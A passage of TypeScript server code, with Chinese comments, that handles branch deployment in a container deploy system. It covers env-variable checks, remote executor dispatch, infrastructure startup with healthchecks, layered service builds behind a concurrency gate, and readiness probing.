          res.end();
          return;
        }
        completeBranchOperation(cleanupLease, cleanupStatus);
        sendSSE(res, 'complete', { ok: true, cleared, message: `已清空所有服务（无构建配置，已下掉 ${cleared.length} 个残留容器）` });
        res.end();
        return;
      }
      // remoteOwned（在线）：不在此 return，放行到下方远端分发（executor 收敛空 payload）。
    }

    // 极速版部署不再硬闸门(用户 2026-06-23 决策:没有镜像默认回退固定主分支,不硬失败)。
    // 镜像可用性由 container.ts runService 逐组件处理:本 commit 镜像拉不到就回退固定主分支
    // 镜像(fallbackImage),两者都拉不到才报错。CI 仍按 path-filter 只构建改动组件(不重复构建),
    // 期间 ciImageStatus=waiting 仅作 UI 反馈 + 触发 CI 完成后的自动重部署,不阻塞手动部署。

    // Phase 8 — env required check:必填项未填则 412 Precondition Failed,UI 弹窗强制感知
    // 用户可以"承诺会跑起来"按 ?ignoreRequired=1 query 强制 deploy(降级路径,不推荐)
    // profiles.length > 0：env 必填闸门是给「要构建启动的服务」用的；走到这里 profiles 非空（空已在上面
    // 的清理分支处理/放行）。保留判断让远端空 payload 收敛路径（remoteOwned 放行）不被 env 闸门误拦。
    const ignoreRequired = req.query?.ignoreRequired === '1' || req.query?.ignoreRequired === 'true';
    if (!ignoreRequired && entry.projectId && profiles.length > 0) {
      const missingRequired = stateService.getMissingRequiredEnvKeys(entry.projectId);
      if (missingRequired.length > 0) {
        const meta = stateService.getEnvMeta(entry.projectId);
        res.status(412).json({
          error: 'required_env_missing',
          message: `还有 ${missingRequired.length} 项必填环境变量未填,deploy 已 block。请到「项目环境变量」补齐:${missingRequired.join(', ')}`,
          missingRequiredEnvKeys: missingRequired,
          // 把 hint 也带上,前端弹窗直接显示
          hints: Object.fromEntries(missingRequired.map((k) => [k, meta[k]?.hint || ''])),
          // 用户硬要 deploy 的逃生口
          escapeHatch: { hint: '附加 ?ignoreRequired=1 query 可跳过此检查(不推荐,可能跑不起来)' },
        });
        return;
      }
    }

    // 资源面板：记录一次构建活动（webhook / 手动 / reconciler 重试统一在此计数），
    // 让「分支少但反复构建」的项目能在资源占用面板按频次排到前面。
    recordBuild(entry.projectId || 'default', entry.id, triggerFromRequest(req));

    const requestCommitSha = typeof req.body?.commitSha === 'string'
      && /^[0-9a-f]{7,40}$/i.test(req.body.commitSha)
      ? req.body.commitSha
      : undefined;
    const requestId = String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || undefined;
    const branchOperationLease = beginBranchOperation(req, res, entry, {
      kind: 'deploy',
      commitSha: requestCommitSha || entry.githubCommitSha || null,
      source: 'api.deploy-branch',
      reason: triggerFromRequest(req) === 'webhook' ? 'GitHub webhook deploy' : 'manual branch deploy',
      sse: true,
    });
    if (branchOperationCoordinator && !branchOperationLease) return;
    let branchOperationFinalStatus: 'completed' | 'failed' | 'cancelled' = 'completed';
    const stopAttribution = stopAttributionFromRequest(req);

    // `lastAccessedAt` is the branch card's "last deploy attempt" clock.
    // Stamp it before dispatching so failures and remote rejections update the
    // visible time just like successful deploys do.
    entry.lastAccessedAt = new Date().toISOString();

    // ── Commit SHA derivation (hoisted before cluster dispatch) ──
    // 极速版镜像 tag 模板 `:sha-${CDS_COMMIT_SHA}` 在 resolveEffectiveProfile
    // 里用 entry.githubCommitSha 解析。集群路径在下面 proxyDeployToExecutor 前
    // 就 return,而 proxyDeployToExecutor 内部已经 resolveEffectiveProfile ——
    // 所以 SHA 必须在「分发决策之前」就 stamp 好,否则远端 payload 的
    // dockerImage 仍是 `:sha-`（空 tag）→ docker pull 必失败（Bugbot review）。
    // 优先级与本地路径一致:① req.body.commitSha（webhook 锚定）② 已存 SHA
    // ③ worktree HEAD 兜底。本地路径下方不再重复推导。
    if (requestCommitSha) {
      entry.githubCommitSha = requestCommitSha;
    } else if (!entry.githubCommitSha && entry.worktreePath) {
      try {
        const sha = await shell.exec('git rev-parse HEAD', { cwd: entry.worktreePath });
        if (sha.exitCode === 0 && sha.stdout.trim()) {
          entry.githubCommitSha = sha.stdout.trim();
        }
      } catch {
        /* non-fatal — 极速版镜像 tag 推导失败时由后续 docker pull 报错暴露 */
      }
    }
    stateService.save();

    // ── Cluster dispatch decision ──
    //
    // Before touching the local deploy path, decide whether this branch
    // should be built on a remote executor. The request body can override
    // the auto-selection with { targetExecutorId: "executor-xxx" }; otherwise
    // the dispatcher picks based on current load. Returns null for the local
    // path (embedded master or no cluster), which is the previous behavior.
    const explicitTarget = (req.body?.targetExecutorId as string | undefined) || undefined;
    const remoteTarget = resolveDeployTarget(entry, explicitTarget);
    if (remoteTarget) {
      // Clear any stale error + clear the local services map since we're
      // handing this branch off to the remote — the master isn't running
      // containers for it, the executor is.
      entry.errorMessage = undefined;
      try {
        branchOperationFinalStatus = await proxyDeployToExecutor(remoteTarget, entry, res, {
          requestId: requestId || null,
          operationId: branchOperationLease?.operationId || null,
          actor: resolveActorFromRequest(req),
          trigger: triggerFromRequest(req),
        });
      } catch (err) {
        branchOperationFinalStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
        throw err;
      } finally {
        completeBranchOperation(branchOperationLease, branchOperationFinalStatus);
      }
      return;
    }

    // Local path: if we were previously dispatched to a remote executor,
    // clear the sticky ownership so GET /api/branches stops reporting the
    // wrong placement.
    if (entry.executorId && registry) {
      const stillRemote = registry.getAll().find(n => n.id === entry.executorId);
      if (stillRemote?.role === 'embedded' || !stillRemote) {
        entry.executorId = undefined;
      }
    }

    initSSE(res);

    const opLog: OperationLog = {
      type: 'build',
      startedAt: new Date().toISOString(),
      status: 'running',
      events: [],
      // 2026-06-27 构建历史元数据：触发器 + commit（部署模式在 finalize 时回填,
      // 那里才有 resolveEffectiveProfile 解析出的 activeDeployMode）。
      triggerSource: classifyTriggerSource(triggerFromRequest(req), entry.deployDispatchRetryCount),
      ...deriveCommitMeta(entry, requestCommitSha),
    };

    function logEvent(ev: OperationLogEvent) {
      opLog.events.push(ev);
      sendSSE(res, 'step', ev);
      logDeploy(id, `[${ev.status}] ${ev.title || ev.step}${ev.log ? ' — ' + ev.log : ''}`);
    }

    // 2026-06-21 Bug A 修复：部署整体 throw（如启动失败）时，catch 块只把
    // entry.status 写成 'error' 并 save()，**没有**向 branchEvents 发
    // branch.status 事件。/branches/stream 订阅者（分支卡片）因此收不到状态翻转，
    // 卡片永远停在"构建中"并继续跑已等待计时，必须手动刷新页面才更新。
    // 这里在 try 外先捕获进入部署前的状态，供 catch 块发事件用（try 内部的
    // const __prevStatus 是块级作用域，catch 看不到）。
    const __deployEntryStatus = entry.status;

    try {
      logDeploy(id, '开始部署');

      // ── Capacity check (v3.1) ──
      // Emit a warning if the host is already over-subscribed. When the
      // warm-pool scheduler is enabled it will evict LRU branches automatically;
      // when it's disabled (default) the warning is the user's only signal
      // that they're at risk of OOM. Non-blocking so disabled setups keep
      // their existing behavior.
      const cap = computeCapacity();
      if (cap.current >= cap.max) {
        const msg = `容量超售: ${cap.current}/${cap.max} 容器 (${cap.totalMemGB}GB 宿主机). 建议启用 scheduler 或手动停止部分分支容器.`;
        logEvent({ step: 'capacity-warn', status: 'warning', title: msg, timestamp: new Date().toISOString() });
        logDeploy(id, `警告 ${msg}`);
      }

      // Clear previous error state on new deploy
      assertBranchOperationCurrent(branchOperationLease, 'before-deploy-state');
      entry.errorMessage = undefined;
      for (const svc of Object.values(entry.services)) {
        if (svc.errorMessage) svc.errorMessage = undefined;
      }
      const __prevStatus = entry.status;
      entry.status = 'building';
      entry.lastAccessedAt = new Date().toISOString();
      // 本轮构建起点锚点 —— 预览等待页 ETA 以此计"已等待"，避免回退到上一轮
      // 已完成的历史 op-log 误算几小时（见 BranchEntry.lastDeployStartedAt）。
      entry.lastDeployStartedAt = new Date().toISOString();
      stateService.save();
      // Live UI: surface the "building" transition to subscribed dashboards
      // so the branch card can flip to a spinner immediately on deploy kick-
      // off, not several seconds later when the first SSE step arrives.
      branchEvents.emitEvent({
        type: 'branch.status',
        payload: {
          branchId: id, projectId: entry.projectId,
          status: 'building', previousStatus: __prevStatus, ts: nowIso(),
        },
      });

      // ── GitHub Checks integration ──
      // commit SHA 已在上方「分发决策之前」按同一优先级
      //   ① req.body.commitSha ② 已存 SHA ③ worktree HEAD
      // stamp 到 entry.githubCommitSha（本地 + 远端共用），此处直接用即可,
      // 不再重复推导。若三者都没解析出来,check-run / 极速版 tag 推导是 no-op。
      // Open an in-progress check run — best effort, errors logged not
      // thrown (so GitHub connectivity issues don't block the deploy).
      await checkRunRunner.ensureOpen(entry);

      // 期望清单收敛上移到 pull 之前（Codex P2「Move local orphan cleanup before fallible deploy steps」）：
      // 「服务从期望清单移除」（额外服务被清 / 项目 profile 被删）的容器拆除不依赖最新代码。原先只在
      // deploy-finalize（pull + infra + db-init + 整个构建循环之后）才拆孤儿，若这些 fallible 步骤在
      // PUT /extra-services?redeploy=1 已落库缩短后的 extraProfiles 之后中途 abort，被移除服务的容器与
      // entry.services 行就留在原地、却没有任何有效 profile 元数据（pathPrefixes 等路由信息消失而旧容器仍跑）。
      // executor 路径已把这步上移到 git pull 之前；本地路径同款前移。profiles 非空已由上方 profiles.length===0
      // 分支保证（空清单走专门的就地清空路径），不会误删全部。fencing-safe：remove 前后各 assertCurrent。
      {
        const desiredIds = new Set(profiles.map((p) => p.id));
        const orphans = Object.entries(entry.services).filter(([sid]) => !desiredIds.has(sid));
        if (orphans.length > 0) {
          const oActor = resolveActorFromRequest(req);
          const oTrigger = triggerFromRequest(req);
          for (const [sid, svc] of orphans) {
            assertBranchOperationCurrent(branchOperationLease, `pre-pull-remove-orphan before ${sid}`);
            logEvent({
              step: 'remove-orphan-service', status: 'running',
              title: `服务 "${sid}" 已从期望清单移除，正在下掉容器…`,
              detail: { profileId: sid, status: svc.status, container: svc.containerName },
              timestamp: new Date().toISOString(),
            });
            try {
              await containerService.remove(svc.containerName, {
                projectId: entry.projectId, branchId: entry.id, profileId: sid,
                requestId: requestId || null, operationId: branchOperationLease?.operationId || null,
                actor: oActor, trigger: oTrigger,
                operation: 'deploy-remove-orphan-service', source: 'api.deploy-branch',
                reason: '服务已从期望清单移除(额外服务被清/项目 profile 被删)',
              });
            } catch (err) {
              logEvent({ step: 'remove-orphan-service', status: 'warning', title: `服务 "${sid}" 容器移除失败(忽略,仍清条目): ${(err as Error).message}`, timestamp: new Date().toISOString() });
            }
            assertBranchOperationCurrent(branchOperationLease, `pre-pull-remove-orphan after ${sid}`);
            delete entry.services[sid];
            stateService.save();
            logEvent({ step: 'remove-orphan-service', status: 'done', title: `服务 "${sid}" 已下掉（已从期望清单移除）`, timestamp: new Date().toISOString() });
          }
        }
      }

      // Pull latest code
      logEvent({ step: 'pull', status: 'running', title: '正在拉取最新代码...', timestamp: new Date().toISOString() });
      await checkRunRunner.progress(entry, {
        title: '拉取最新代码…',
        summary: `分支: \`${entry.branch}\`\n阶段: git fetch + reset`,
        force: true,
      });
      const pullResult = isSyntheticCdsManagedRuntimeBranch(entry, deployProject)
        ? { head: entry.githubCommitSha || 'cds-managed-runtime', skipped: true, reason: 'synthetic-cds-managed-runtime' }
        : await worktreeService.pull(entry.branch, entry.worktreePath);
      logEvent({ step: 'pull', status: 'done', title: `已拉取: ${pullResult.head}`, detail: pullResult as unknown as Record<string, unknown>, timestamp: new Date().toISOString() });

      // 非极速版（源码编译）路径:镜像/构建用 pull 后真实 HEAD,故无显式 body.commitSha 时
      // 用 pullResult.head 刷新 githubCommitSha,避免镜像 tag/构建对应到 pull 前旧 SHA
      // （Codex P2: refresh prebuilt SHA after pulling latest code）。
      // **极速版例外**：极速版镜像由 CI 按 commit 预构建,只有 ciTargetSha(=CI ready 的 SHA)
      // 才有可拉取的镜像。绝不能跟随 pull 后的新 HEAD（那个 SHA 多半还没 CI 镜像）——上面的
      // CI 闸门已保证 ciImageStatus=ready 且 ciTargetSha===githubCommitSha,这里保持不动,
      // 让镜像 tag 锁定在 CI 就绪的 SHA（Codex P2: require CI readiness for the deployed SHA）。
      // pull() 的 head 是 `git log --oneline -1`（带标题），不是裸 SHA；必须用 parsePulledSha
      // 取裸 SHA（优先 after = rev-parse --short HEAD），否则旧的 bare-SHA 正则永不匹配、整段跳过，
      // 历史「版本」列停在 pull 前旧 SHA（Codex P2）。
      const pulledSha = parsePulledSha(pullResult);
      // 源码 pull（非极速版、未 skip、解析出 SHA）：deploy 总是 reset 到分支 HEAD（下方清
      // pinnedCommit、"deploy always restores to branch HEAD"），落地的就是 pulledSha。
      const isSourcePull = !branchUsesPrebuiltMode(profiles, entry)
        && !(pullResult as { skipped?: boolean }).skipped
        && !!pulledSha;
      if (!requestCommitSha && isSourcePull && shouldRefreshCommitSha(entry.githubCommitSha, pulledSha)) {
        // entry.githubCommitSha 被 check-run/release/集成复用：仅在**未显式请求** commit 时跟随 HEAD。
        entry.githubCommitSha = pulledSha;
      }
      // 构建历史「版本」列必须记**实际部署**的 SHA = pulledSha，**不受 requestCommitSha 影响**：
      // 即使 webhook 带 requestCommitSha=A、origin 已前进到 B，pull hard-reset 到分支 HEAD 落地的是 B，
      // 冻结在请求 SHA 上会给 reviewer 指错版本（Codex P2「Do not freeze webhook history on the
      // requested SHA」）。极速版/skip 除外（镜像锁 CI 就绪 SHA，opLog 保持 deriveCommitMeta(entry,…) 初值）。
      if (isSourcePull) {
        Object.assign(opLog, deriveCommitMeta(entry, pulledSha));
      }

      // Clear pinned commit — deploy always restores to branch HEAD
      if (entry.pinnedCommit) {
        entry.pinnedCommit = undefined;
        logEvent({ step: 'pull', status: 'done', title: '已取消固定提交，恢复到分支最新', timestamp: new Date().toISOString() });
      }
      stateService.save();

      // ── Ensure required infrastructure is running ──
      // A profile can depend on project infra such as mongodb/redis and use
      // env templates like ${CDS_MONGODB_PORT}. Those CDS_* vars only exist
      // after the infra container is running, so deploy should bring required
      // infra up before resolving app service env, matching Railway-style
      // service references instead of asking users to copy ports manually.
      //
      // * 2026-05-05 重大语义修正（用户反馈"数据库不需要构建"）：
      // infra 默认是 shared 模式 —— 一旦启动就是 long-lived 资源，所有分支
      // 共用一份 mongo/redis。deploy 不能重启或删除正在运行的 shared infra。
      //
      // 历史 bug：原版本无脑 computeRequiredInfra → 兜底逻辑把"docker 实际未
      // running 的 infra"全部加进 required，触发 startInfraService → docker
      // rm -f → 杀掉用户正在共享使用的 mongo 容器（连接断、SSE 中断、所有
      // 页面 502），还偶发 race condition 报"container name already in use"
      // 让 deploy 整体 fail。
      //
      // 2026-05-12 补充：沙盒导入 / 新建项目会先落 InfraService，但首次
      // deploy 时容器还没启动。shared 模式仍需要用幂等 start 确保本次服务
      // 显式依赖的 infra 可用；startInfraService 对 running 容器是 noop。
      const projectMeta = stateService.getProject(entry.projectId || 'default');
      const perBranchInfra = projectMeta?.infraIsolation === 'per-branch';
      const projectInfra = stateService.getInfraServicesForProject(entry.projectId || 'default');
      const actualInfraState = await containerService.discoverInfraContainers();
      const requiredInfraIds = computeRequiredInfra(profiles, projectInfra, actualInfraState);
      const startedInfraIds = new Set<string>();
      if (!perBranchInfra) {
        logEvent({
          step: 'infra-shared',
          status: requiredInfraIds.size > 0 ? 'running' : 'done',
          title: requiredInfraIds.size > 0
            ? `基础设施为共享模式 —— 正在确保 ${requiredInfraIds.size} 个依赖可用`
            : '基础设施为共享模式 —— 未发现需要启动的依赖',
          detail: { requiredInfra: Array.from(requiredInfraIds) },
          timestamp: new Date().toISOString(),
        });
      }
      for (const infraId of requiredInfraIds) {
        const infra = stateService.getInfraServiceForProjectAndId(entry.projectId || 'default', infraId);
        // Phase 2 fix:不再用 infra.status === 'running' 跳过 — requiredInfraIds 已经
        // 经过 docker 实际状态过滤(actualInfraState),如果 stale state 写 running 但
        // 容器实际不在,这里不能 trust state。只 skip 真正不存在的 infra。
        if (!infra) continue;
        logEvent({
          step: `infra-${infra.id}`,
          status: 'running',
          title: `正在启动依赖基础设施 ${infra.name || infra.id}...`,
          timestamp: new Date().toISOString(),
        });
        let startedInfra = infra;
        try {
          startedInfra = await startInfraWithPortRetry(infra, entry.projectId || 'default');
        } catch (err) {
          const message = (err as Error).message;
          stateService.updateInfraService(infra.id, { status: 'error', errorMessage: message }, entry.projectId || 'default');
          logEvent({
            step: `infra-${infra.id}`,
            status: 'error',
            title: `${infra.name || infra.id} 启动失败`,
            log: message,
            timestamp: new Date().toISOString(),
          });
          throw err;
        }
        stateService.updateInfraService(startedInfra.id, { status: 'running', errorMessage: undefined }, entry.projectId || 'default');
        startedInfraIds.add(startedInfra.id);
        logEvent({
          step: `infra-${startedInfra.id}`,
          status: 'done',
          title: `${startedInfra.name || startedInfra.id} 已启动 :${startedInfra.hostPort}`,
          timestamp: new Date().toISOString(),
        });
      }
      if (requiredInfraIds.size > 0) stateService.save();

      // ── Phase 7 fix(B12,2026-05-01) — wait for infra service_healthy ──
      // CDS 历史 dependsOn 实现只达到 service_started(容器在跑),但很多
      // 应用 image 的 ENTRYPOINT 启动后立即连 db,如果 db healthcheck
      // 还没 pass,应用 connect → ECONNREFUSED → 容器 exit 2。Twenty 实战
      // 暴露:server image entrypoint 自跑 psql,db 5432 端口已 listening
      // 但 healthcheck 还在 starting → server 连失败 exit。
      //
      // 修法:起完 infra 后、起 app 前,对每个有 healthcheck 配置的 infra
      // 轮询 docker inspect health,直到 healthy 或 60s 超时。无 healthcheck
      // 的 infra 跳过(不阻塞)。
      //
      // shared 模式只等待本轮刚启动的 infra，避免每次部署都阻塞在长期运行
      // 的共享资源上；per-branch 模式等待该分支所有运行中的 infra。
      const infraToWait = stateService.getInfraServicesForProject(entry.projectId || 'default')
        .filter(s => s.status === 'running' && s.healthCheck && (perBranchInfra || startedInfraIds.has(s.id)));
      for (const infra of infraToWait) {
        const stepId = `infra-${infra.id}-healthy`;
        logEvent({
          step: stepId, status: 'running',
          title: `等待 ${infra.name || infra.id} healthcheck 通过…`,
          timestamp: new Date().toISOString(),
        });
        const HEALTH_TIMEOUT_MS = 60_000;
        const HEALTH_INTERVAL_MS = 1500;
        const startedAt = Date.now();
        let healthy = false;
        let lastStatus = 'unknown';
        while (Date.now() - startedAt < HEALTH_TIMEOUT_MS) {
          const status = await containerService.getInfraHealth(infra.containerName);
          lastStatus = status;
          if (status === 'healthy') { healthy = true; break; }
          // 'none' 表示该容器没配 healthcheck — 视为通过(不阻塞)
          if (status === 'none') { healthy = true; break; }
          if (status === 'unhealthy') break;  // 立刻报错
          await new Promise(r => setTimeout(r, HEALTH_INTERVAL_MS));
        }
        if (!healthy) {
          logEvent({
            step: stepId, status: 'error',
            title: `${infra.name || infra.id} healthcheck 未通过(${lastStatus},${HEALTH_TIMEOUT_MS / 1000}s 内)`,
            log: '应用容器可能在 db 真正 ready 之前抢跑;扩大 healthcheck retries 或调大 HEALTH_TIMEOUT_MS。',
            timestamp: new Date().toISOString(),
          });
          // 非致命:继续往下跑,让应用层报真实错误
        } else {
          logEvent({
            step: stepId, status: 'done',
            title: `${infra.name || infra.id} healthy OK`,
            timestamp: new Date().toISOString(),
          });
        }
      }

      await runDatabaseInitializationForDeploy({
        entry,
        profiles,
        requestId,
        operationId: branchOperationLease?.operationId || undefined,
        actor: resolveActorFromRequest(req),
        trigger: triggerFromRequest(req),
        assertCurrent: (step) => assertBranchOperationCurrent(branchOperationLease, step),
        logEvent,
      });

      // ── Compute startup layers (topological sort by dependsOn) ──
      // P4 Part 17 (G2 fix): scope infra by the branch's project so the
      // dependency resolver only sees infra services actually owned by
      // this project. Avoids cross-project bleed where project A's
      // dependsOn references could resolve to project B's mongo.
      const infraIds = new Set(
        stateService.getInfraServicesForProject(entry.projectId || 'default')
          .filter(s => s.status === 'running')
          .map(s => s.id),
      );

      const { layers, warnings: topoWarnings } = topoSortLayers(
        profiles,
        p => p.id,
        p => p.dependsOn ?? [],
        infraIds,
      );

      // ── Trace: dependency graph + layer plan ──
      const depGraph: Record<string, string[]> = {};
      for (const p of profiles) {
        if (p.dependsOn && p.dependsOn.length > 0) depGraph[p.id] = p.dependsOn;
      }
      logEvent({
        step: 'startup-plan',
        status: 'info',
        title: `启动计划: ${layers.length} 层, ${profiles.length} 服务`,
        detail: {
          dependencyGraph: depGraph,
          layers: layers.map(l => ({ layer: l.layer, services: l.items.map(p => p.id) })),
          resolvedInfra: Array.from(infraIds),
          ...(topoWarnings.length > 0 ? { warnings: topoWarnings } : {}),
        },
        timestamp: new Date().toISOString(),
      });

      // ── Pre-allocate ports (before parallel execution) ──
      const liveUsedPorts = await collectListeningPorts(shell);
      for (const profile of profiles) {
        if (!entry.services[profile.id]) {
          const hostPort = stateService.allocatePort(config.portStart, liveUsedPorts);
          liveUsedPorts.add(hostPort);
          entry.services[profile.id] = {
            profileId: profile.id,
            containerName: `cds-${id}-${profile.id}`,
            hostPort,
            status: 'idle',
          };
        }
      }
      stateService.save();

      // ── Execute layer by layer (parallel within each layer) ──
      for (let layerIdx = 0; layerIdx < layers.length; layerIdx++) {
        const layer = layers[layerIdx];
        const layerServiceNames = layer.items.map(p => p.name).join(', ');
        logEvent({
          step: `layer-${layer.layer}`,
          status: 'running',
          title: `启动第 ${layer.layer} 层: ${layerServiceNames}`,
          timestamp: new Date().toISOString(),
        });
        // Progress PATCH to GitHub so PR reviewers refreshing the Checks
        // panel see "构建第 X/Y 层 (services...)" instead of a stale
        // "Deploying to CDS…" for the entire build. Force=true so layer
        // transitions always push even inside the 5s throttle window.
        await checkRunRunner.progress(entry, {
          title: `构建第 ${layerIdx + 1}/${layers.length} 层`,
          summary: `分支 \`${entry.branch}\` 正在并行构建: ${layerServiceNames}`,
          force: true,
        });

        const layerStartTime = Date.now();

        await Promise.all(layer.items.map(async (profile) => {
          // Resolve baseline → 项目默认 → 分支 override → mode override
          const effectiveProfile = resolveEffectiveProfile(profile, entry);
          const branchOverride = entry.profileOverrides?.[profile.id];
          const activeMode = effectiveProfile.activeDeployMode;
          const modeLabel = activeMode && effectiveProfile.deployModes?.[activeMode]
            ? ` [${effectiveProfile.deployModes[activeMode].label}]`
            : '';
          const overrideLabel = branchOverride ? ' (分支自定义)' : '';
          const serviceStartTime = Date.now();

          // ── 全局构建并发闸 ──
          // 撞上 CDS_MAX_CONCURRENT_BUILDS 上限时排队，避免多分支构建同时跑把
          // 宿主 CPU 吃满、彼此饿死（实测并发时 admin 构建从 ~300s 膨胀到 845s）。
          // 排队状态写进部署日志 + SSE，让用户看到「排队中，前面还有 N 个」而不是
          // 疑似卡死的 spinner（expectation-management.md：排队 ≠ 卡死，必须可感知）。
          let queueRefreshTimer: NodeJS.Timeout | undefined;
          const clearQueueTimer = () => {
            if (queueRefreshTimer) {
              clearInterval(queueRefreshTimer);
              queueRefreshTimer = undefined;
            }
          };
          const buildSlot = await acquireBuildSlot({
            onQueued: ({ ahead, active, max }) => {
              logEvent({
                step: `queue-${profile.id}`,
                status: 'info',
                title: `${effectiveProfile.name} 排队等待构建槽位：前面还有 ${ahead} 个在等待（${active} 个正在构建，并发上限 ${max}）`,
                timestamp: new Date().toISOString(),
              });
              sendSSE(res, 'log', { profileId: profile.id, chunk: `[build-gate] 排队中：前面还有 ${ahead} 个构建（${active}/${max} 进行中）...\n` });
              // 每 15s 刷新一次排队位置，长时间排队也持续有动静（不像卡死）。
              queueRefreshTimer = setInterval(() => {
                const s = buildGateStatus();
                logEvent({
                  step: `queue-${profile.id}`,
                  status: 'info',
                  title: `${effectiveProfile.name} 仍在排队：${s.queued} 个等待中 / ${s.active} 个构建中（上限 ${s.max}）`,
                  timestamp: new Date().toISOString(),
                });
                sendSSE(res, 'log', { profileId: profile.id, chunk: `[build-gate] 仍在排队：${s.queued} 等待 / ${s.active} 构建中\n` });
              }, 15000);
              if (typeof queueRefreshTimer.unref === 'function') queueRefreshTimer.unref();
            },
            onStart: ({ waitedMs }) => {
              clearQueueTimer();
              logEvent({
                step: `queue-${profile.id}`,
                status: 'info',
                title: `${effectiveProfile.name} 排队结束（等待 ${Math.round(waitedMs / 1000)}s），开始构建`,
                timestamp: new Date().toISOString(),
              });
              sendSSE(res, 'log', { profileId: profile.id, chunk: `[build-gate] 排队结束（等待 ${Math.round(waitedMs / 1000)}s），开始构建\n` });
            },
          });
          clearQueueTimer();

          logEvent({
            step: `build-${profile.id}`,
            status: 'running',
            title: `正在构建 ${profile.name}${modeLabel}${overrideLabel}...`,
            timestamp: new Date().toISOString(),
          });

          const svc = entry.services[profile.id];
          svc.status = 'building';

          try {
            const mergedEnv = getMergedEnv(entry.projectId, entry.id);
            await archiveBranchContainerLogs({
              stateService,
              containerService,
              branch: entry,
              source: 'pre-deploy-recreate',
              profileIds: new Set([profile.id]),
              serverEventLogStore,
              message: 'captured before docker rm/run during branch deploy',
              requestId: requestId || null,
              operationId: branchOperationLease?.operationId || null,
              actor: resolveActorFromRequest(req),
              trigger: triggerFromRequest(req),
            });

            // ── Trace: resolved CDS_* env vars for this service ──
            const cdsVars: Record<string, string> = {};
            for (const [k, v] of Object.entries(mergedEnv)) {
              if (k.startsWith('CDS_')) cdsVars[k] = v;
            }
            logEvent({
              step: `env-${profile.id}`,
              status: 'info',
              title: `${effectiveProfile.name} 环境变量`,
              detail: {
                cdsVars: maskSecrets(cdsVars),
                profileEnvKeys: Object.keys(effectiveProfile.env ?? {}),
                deployMode: effectiveProfile.activeDeployMode || 'default',
                branchOverrideKeys: branchOverride ? Object.keys(branchOverride) : [],
              },
              timestamp: new Date().toISOString(),
            });

            await runServiceWithPortRetry({
              stateService,
              shell,
              config,
              containerService,
              serverEventLogStore,
              entry,
              profile: effectiveProfile,
              service: svc,
              customEnv: mergedEnv,
              requestId: requestId || null,
              operationId: branchOperationLease?.operationId || null,
              actor: resolveActorFromRequest(req),
              trigger: triggerFromRequest(req),
              assertCurrent: (step) => assertBranchOperationCurrent(branchOperationLease, step),
              onPortChanged: ({ oldPort, newPort, attempt }) => {
                logEvent({
                  step: `port-${profile.id}`,
                  status: 'warning',
                  title: `${effectiveProfile.name} 端口 ${oldPort} 已占用，改用 :${newPort} 重试`,
                  detail: { oldPort, newPort, attempt },
                  timestamp: new Date().toISOString(),
                });
              },
              onOutput: (chunk) => {
                sendSSE(res, 'log', { profileId: profile.id, chunk });
                for (const line of chunk.split('\n')) {
                  if (line.trim()) {
                    logDeploy(id, line);
                    // Also store container output in operation log for historical viewing
                    opLog.events.push({
                      step: `log-${profile.id}`,
                      status: 'info',
                      title: line.trim(),
                      timestamp: new Date().toISOString(),
                    });
                  }
                }
              },
            });

            assertBranchOperationCurrent(branchOperationLease, `after-run-${profile.id}`);
            // Phase 1 passed (container alive). Enter 'starting' and gate the
            // transition to 'running' on either a startup-log signal or an
            // HTTP/TCP readiness probe. Closes the gap that used to surface
            // as Cloudflare 502 while the container was alive but the app
            // wasn't yet listening. See .claude/rules/cds-auto-deploy.md.
            svc.status = 'starting';
            stateService.save();
            // Broadcast service-level transition so Dashboard + preview
            // waiting page update without waiting for the next deploy SSE
            // event.
            branchEvents.emitEvent({
              type: 'branch.status',
              payload: { branchId: id, projectId: entry.projectId, status: 'starting', previousStatus: 'building', ts: nowIso() },
            });

            let ready = false;
            if (profile.startupSignal) {
              const elapsed = Date.now() - serviceStartTime;
              logEvent({
                step: `build-${profile.id}`,
                status: 'done',
                title: `${profile.name} 容器已启动，等待启动信号 :${svc.hostPort}`,
                detail: { elapsedMs: elapsed, startupSignal: profile.startupSignal },
                timestamp: new Date().toISOString(),
              });

              ready = await containerService.waitForStartupSignal(svc.containerName, profile.startupSignal, (chunk) => {
                for (const line of chunk.split('\n')) {
                  if (line.trim()) logDeploy(id, line);
                }
              });
            }

            // Always run the port-level readiness probe (even after a
            // startup signal succeeded) so we never mark a service running
            // while its host-port binding is still racing. Default TCP
            // probe when no `readinessProbe` is configured.
            if (!profile.startupSignal || ready) {
              const probeReady = await containerService.waitForReadiness(
                svc.hostPort,
                // 发布阶段就绪探测：抬到部署下限(默认 1200s)，避免慢首启被误杀。运行期重启/唤醒不走这里。
                applyDeployReadinessFloor(
                  profile.readinessProbe,
                  resolveDeployReadinessFloorSeconds(
                    stateService.getState().deployReadinessFloorSeconds,
                    stateService.getProject(entry.projectId || 'default')?.deployReadinessFloorSeconds,
                  ),
                ),
                (info) => {
                  sendSSE(res, 'probe', {
                    profileId: profile.id,
                    attempt: info.attempt,
                    max: info.max,
                    stage: info.stage,
                    ok: info.ok,
                    error: info.error,
                  });
                },
                (chunk) => {
                  for (const line of chunk.split('\n')) {
                    if (line.trim()) logDeploy(id, line);
                  }
                },
              );
              ready = ready ? probeReady : probeReady;
            }

            if (ready) {
              svc.status = 'running';
              svc.errorMessage = undefined;
              // 2026-05-14 真实态徽章：钉住容器**实际**用哪个 deploy mode 启动。
              // 2026-06-24（Bugbot）：runService 已在容器实际起来后权威钉过 svc.deployedMode
              // （含极速版→源码自动回退后的真实模式），优先采纳它；仅其未设时退回
              // effectiveProfile.activeDeployMode（极速版会是 express，回退场景下不准）。
              svc.deployedMode = svc.deployedMode || effectiveProfile.activeDeployMode || '';
              logDeploy(id, `${profile.name} 启动成功 OK`);
              const elapsed = Date.now() - serviceStartTime;
              logEvent({
                step: `build-${profile.id}`,
                status: 'done',
                title: `${profile.name} 运行于 :${svc.hostPort}`,
                detail: { elapsedMs: elapsed },
                timestamp: new Date().toISOString(),
              });
            } else {
              svc.status = 'error';
              svc.errorMessage = await buildReadinessTimeoutMessage(containerService, svc.containerName);
              logDeploy(id, `${profile.name} 就绪探测超时`);
              logEvent({
                step: `build-${profile.id}`,
                status: 'error',
                title: `${profile.name} 就绪探测超时`,
                detail: { elapsedMs: Date.now() - serviceStartTime },
                timestamp: new Date().toISOString(),
              });
            }
            stateService.save();
          } catch (err) {
            if (err instanceof BranchOperationSupersededError) throw err;
            svc.status = 'error';
            svc.errorMessage = (err as Error).message;
